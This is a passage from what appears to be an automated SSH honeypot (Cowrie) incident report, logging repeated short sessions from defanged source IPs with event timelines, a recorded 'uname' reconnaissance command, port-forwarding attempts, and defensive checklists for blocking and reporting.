| `2026-08-04 15:47:08` | `cowrie.client.kex` |
| `2026-08-04 15:47:08` | `cowrie.login.success` |
| `2026-08-04 15:47:09` | `cowrie.session.params` |
| `2026-08-04 15:47:09` | `cowrie.command.input` |
| `2026-08-04 15:47:09` | `cowrie.log.closed` |
| `2026-08-04 15:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82dd8588f62c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:48 |
| **Last Seen** | 2026-08-04 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:48:55` | `cowrie.session.connect` |
| `2026-08-04 15:48:55` | `cowrie.client.version` |
| `2026-08-04 15:48:55` | `cowrie.client.kex` |
| `2026-08-04 15:48:56` | `cowrie.login.success` |
| `2026-08-04 15:48:57` | `cowrie.session.params` |
| `2026-08-04 15:48:57` | `cowrie.command.input` |
| `2026-08-04 15:48:57` | `cowrie.log.closed` |
| `2026-08-04 15:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4633456e39b

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
| **First Seen** | 2026-08-04 15:49 |
| **Last Seen** | 2026-08-04 15:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:49:48` | `cowrie.session.connect` |
| `2026-08-04 15:49:48` | `cowrie.client.version` |
| `2026-08-04 15:49:48` | `cowrie.client.kex` |
| `2026-08-04 15:49:48` | `cowrie.login.success` |
| `2026-08-04 15:49:48` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:49:49` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8489e04473

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:50 |
| **Last Seen** | 2026-08-04 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:50:40` | `cowrie.session.connect` |
| `2026-08-04 15:50:40` | `cowrie.client.version` |
| `2026-08-04 15:50:40` | `cowrie.client.kex` |
| `2026-08-04 15:50:40` | `cowrie.login.success` |
| `2026-08-04 15:50:41` | `cowrie.session.params` |
| `2026-08-04 15:50:41` | `cowrie.command.input` |
| `2026-08-04 15:50:41` | `cowrie.log.closed` |
| `2026-08-04 15:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c954b7612f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:52 |
| **Last Seen** | 2026-08-04 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:52:31` | `cowrie.session.connect` |
| `2026-08-04 15:52:31` | `cowrie.client.version` |
| `2026-08-04 15:52:31` | `cowrie.client.kex` |
| `2026-08-04 15:52:31` | `cowrie.login.success` |
| `2026-08-04 15:52:32` | `cowrie.session.params` |
| `2026-08-04 15:52:32` | `cowrie.command.input` |
| `2026-08-04 15:52:32` | `cowrie.log.closed` |
| `2026-08-04 15:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe16354f344d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-04 15:54 |
| **Last Seen** | 2026-08-04 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:54:17` | `cowrie.session.connect` |
| `2026-08-04 15:54:17` | `cowrie.client.version` |
| `2026-08-04 15:54:17` | `cowrie.client.kex` |
| `2026-08-04 15:54:18` | `cowrie.login.success` |
| `2026-08-04 15:54:18` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:54:18` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f0ba28bbb3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:54 |
| **Last Seen** | 2026-08-04 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:54:21` | `cowrie.session.connect` |
| `2026-08-04 15:54:21` | `cowrie.client.version` |
| `2026-08-04 15:54:21` | `cowrie.client.kex` |
| `2026-08-04 15:54:21` | `cowrie.login.success` |
| `2026-08-04 15:54:22` | `cowrie.session.params` |
| `2026-08-04 15:54:22` | `cowrie.command.input` |
| `2026-08-04 15:54:22` | `cowrie.log.closed` |
| `2026-08-04 15:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc3a764e842

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:56 |
| **Last Seen** | 2026-08-04 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:56:07` | `cowrie.session.connect` |
| `2026-08-04 15:56:07` | `cowrie.client.version` |
| `2026-08-04 15:56:08` | `cowrie.client.kex` |
| `2026-08-04 15:56:08` | `cowrie.login.success` |
| `2026-08-04 15:56:09` | `cowrie.session.params` |
| `2026-08-04 15:56:09` | `cowrie.command.input` |
| `2026-08-04 15:56:09` | `cowrie.log.closed` |
| `2026-08-04 15:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b35a46cfc23

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:57 |
| **Last Seen** | 2026-08-04 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:57:53` | `cowrie.session.connect` |
| `2026-08-04 15:57:53` | `cowrie.client.version` |
| `2026-08-04 15:57:53` | `cowrie.client.kex` |
| `2026-08-04 15:57:54` | `cowrie.login.success` |
| `2026-08-04 15:57:54` | `cowrie.session.params` |
| `2026-08-04 15:57:54` | `cowrie.command.input` |
| `2026-08-04 15:57:55` | `cowrie.log.closed` |
| `2026-08-04 15:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0917dbb0cab9

| Field | Detail |
|---|---|
| **Source IP** | `188.168.86[.]6` |
| **First Seen** | 2026-08-04 15:58 |
| **Last Seen** | 2026-08-04 15:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:58:08` | `cowrie.session.connect` |
| `2026-08-04 15:58:09` | `cowrie.client.version` |
| `2026-08-04 15:58:09` | `cowrie.client.kex` |
| `2026-08-04 15:58:12` | `cowrie.login.success` |
| `2026-08-04 15:58:13` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.168.86[.]6` to AbuseIPDB if not already reported
- [ ] Block `188.168.86[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56016b79c67

| Field | Detail |
|---|---|
| **Source IP** | `121.202.146[.]144` |
| **First Seen** | 2026-08-04 15:58 |
| **Last Seen** | 2026-08-04 15:58 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:58:19` | `cowrie.session.connect` |
| `2026-08-04 15:58:21` | `cowrie.client.version` |
| `2026-08-04 15:58:21` | `cowrie.client.kex` |
| `2026-08-04 15:58:28` | `cowrie.login.success` |
| `2026-08-04 15:58:31` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.146[.]144` to AbuseIPDB if not already reported
- [ ] Block `121.202.146[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc9fb225d4d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:59 |
| **Last Seen** | 2026-08-04 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:59:43` | `cowrie.session.connect` |
| `2026-08-04 15:59:43` | `cowrie.client.version` |
| `2026-08-04 15:59:43` | `cowrie.client.kex` |
| `2026-08-04 15:59:44` | `cowrie.login.success` |
| `2026-08-04 15:59:45` | `cowrie.session.params` |
| `2026-08-04 15:59:45` | `cowrie.command.input` |
| `2026-08-04 15:59:45` | `cowrie.log.closed` |
| `2026-08-04 15:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55451d947c11

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]230` |
| **First Seen** | 2026-08-04 16:01 |
| **Last Seen** | 2026-08-04 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:01:16` | `cowrie.session.connect` |
| `2026-08-04 16:01:16` | `cowrie.client.version` |
| `2026-08-04 16:01:16` | `cowrie.client.kex` |
| `2026-08-04 16:01:16` | `cowrie.login.success` |
| `2026-08-04 16:01:17` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:01:17` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]230` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c3cf4eb8f3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:01 |
| **Last Seen** | 2026-08-04 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:01:33` | `cowrie.session.connect` |
| `2026-08-04 16:01:33` | `cowrie.client.version` |
| `2026-08-04 16:01:33` | `cowrie.client.kex` |
| `2026-08-04 16:01:33` | `cowrie.login.success` |
| `2026-08-04 16:01:34` | `cowrie.session.params` |
| `2026-08-04 16:01:34` | `cowrie.command.input` |
| `2026-08-04 16:01:34` | `cowrie.log.closed` |
| `2026-08-04 16:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978e43719b92

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:03 |
| **Last Seen** | 2026-08-04 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:03:17` | `cowrie.session.connect` |
| `2026-08-04 16:03:17` | `cowrie.client.version` |
| `2026-08-04 16:03:17` | `cowrie.client.kex` |
| `2026-08-04 16:03:18` | `cowrie.login.success` |
| `2026-08-04 16:03:19` | `cowrie.session.params` |
| `2026-08-04 16:03:19` | `cowrie.command.input` |
| `2026-08-04 16:03:19` | `cowrie.log.closed` |
| `2026-08-04 16:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d098393491d3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-04 16:03 |
| **Last Seen** | 2026-08-04 16:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:03:26` | `cowrie.session.connect` |
| `2026-08-04 16:03:27` | `cowrie.client.version` |
| `2026-08-04 16:03:27` | `cowrie.client.kex` |
| `2026-08-04 16:03:28` | `cowrie.login.success` |
| `2026-08-04 16:03:28` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34f23c3ec105

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-08-04 16:03 |
| **Last Seen** | 2026-08-04 16:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:03:39` | `cowrie.session.connect` |
| `2026-08-04 16:03:39` | `cowrie.client.version` |
| `2026-08-04 16:03:39` | `cowrie.client.kex` |
| `2026-08-04 16:03:40` | `cowrie.login.success` |
| `2026-08-04 16:03:40` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9677fd960930

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:05 |
| **Last Seen** | 2026-08-04 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:05:05` | `cowrie.session.connect` |
| `2026-08-04 16:05:05` | `cowrie.client.version` |
| `2026-08-04 16:05:05` | `cowrie.client.kex` |
| `2026-08-04 16:05:05` | `cowrie.login.success` |
| `2026-08-04 16:05:06` | `cowrie.session.params` |
| `2026-08-04 16:05:06` | `cowrie.command.input` |
| `2026-08-04 16:05:06` | `cowrie.log.closed` |
| `2026-08-04 16:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b691b70366f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:06 |
| **Last Seen** | 2026-08-04 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:06:55` | `cowrie.session.connect` |
| `2026-08-04 16:06:55` | `cowrie.client.version` |
| `2026-08-04 16:06:55` | `cowrie.client.kex` |
| `2026-08-04 16:06:55` | `cowrie.login.success` |
| `2026-08-04 16:06:56` | `cowrie.session.params` |
| `2026-08-04 16:06:56` | `cowrie.command.input` |
| `2026-08-04 16:06:56` | `cowrie.log.closed` |
| `2026-08-04 16:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d333b244c79b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:08 |
| **Last Seen** | 2026-08-04 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:08:41` | `cowrie.session.connect` |
| `2026-08-04 16:08:41` | `cowrie.client.version` |
| `2026-08-04 16:08:41` | `cowrie.client.kex` |
| `2026-08-04 16:08:42` | `cowrie.login.success` |
| `2026-08-04 16:08:43` | `cowrie.session.params` |
| `2026-08-04 16:08:43` | `cowrie.command.input` |
| `2026-08-04 16:08:43` | `cowrie.log.closed` |
| `2026-08-04 16:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef27d2913c9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:10 |
| **Last Seen** | 2026-08-04 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:10:26` | `cowrie.session.connect` |
| `2026-08-04 16:10:26` | `cowrie.client.version` |
| `2026-08-04 16:10:27` | `cowrie.client.kex` |
| `2026-08-04 16:10:27` | `cowrie.login.success` |
| `2026-08-04 16:10:27` | `cowrie.session.params` |
| `2026-08-04 16:10:27` | `cowrie.command.input` |
| `2026-08-04 16:10:28` | `cowrie.log.closed` |
| `2026-08-04 16:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed98ea4e2e54

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:12 |
| **Last Seen** | 2026-08-04 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:12:19` | `cowrie.session.connect` |
| `2026-08-04 16:12:19` | `cowrie.client.version` |
| `2026-08-04 16:12:19` | `cowrie.client.kex` |
| `2026-08-04 16:12:19` | `cowrie.login.success` |
| `2026-08-04 16:12:20` | `cowrie.session.params` |
| `2026-08-04 16:12:20` | `cowrie.command.input` |
| `2026-08-04 16:12:20` | `cowrie.log.closed` |
| `2026-08-04 16:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f814219e5d2e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:14 |
| **Last Seen** | 2026-08-04 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:14:13` | `cowrie.session.connect` |
| `2026-08-04 16:14:13` | `cowrie.client.version` |
| `2026-08-04 16:14:13` | `cowrie.client.kex` |
| `2026-08-04 16:14:13` | `cowrie.login.success` |
| `2026-08-04 16:14:14` | `cowrie.session.params` |
| `2026-08-04 16:14:14` | `cowrie.command.input` |
| `2026-08-04 16:14:14` | `cowrie.log.closed` |
| `2026-08-04 16:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c084ea226d9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 16:14 |
| **Last Seen** | 2026-08-04 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:14:55` | `cowrie.session.connect` |
| `2026-08-04 16:14:55` | `cowrie.client.version` |
| `2026-08-04 16:14:55` | `cowrie.client.kex` |
| `2026-08-04 16:14:55` | `cowrie.login.success` |
| `2026-08-04 16:14:56` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:14:56` | `cowrie.direct-tcpip.data` |
| `2026-08-04 16:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7c71a098ae

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:16 |
| **Last Seen** | 2026-08-04 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:16:02` | `cowrie.session.connect` |
| `2026-08-04 16:16:02` | `cowrie.client.version` |
| `2026-08-04 16:16:02` | `cowrie.client.kex` |
| `2026-08-04 16:16:02` | `cowrie.login.success` |
| `2026-08-04 16:16:03` | `cowrie.session.params` |
| `2026-08-04 16:16:03` | `cowrie.command.input` |
| `2026-08-04 16:16:03` | `cowrie.log.closed` |
| `2026-08-04 16:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f2e10fff6f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:17 |
| **Last Seen** | 2026-08-04 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:17:55` | `cowrie.session.connect` |
| `2026-08-04 16:17:55` | `cowrie.client.version` |
| `2026-08-04 16:17:55` | `cowrie.client.kex` |
| `2026-08-04 16:17:55` | `cowrie.login.success` |
| `2026-08-04 16:17:56` | `cowrie.session.params` |
| `2026-08-04 16:17:56` | `cowrie.command.input` |
| `2026-08-04 16:17:56` | `cowrie.log.closed` |
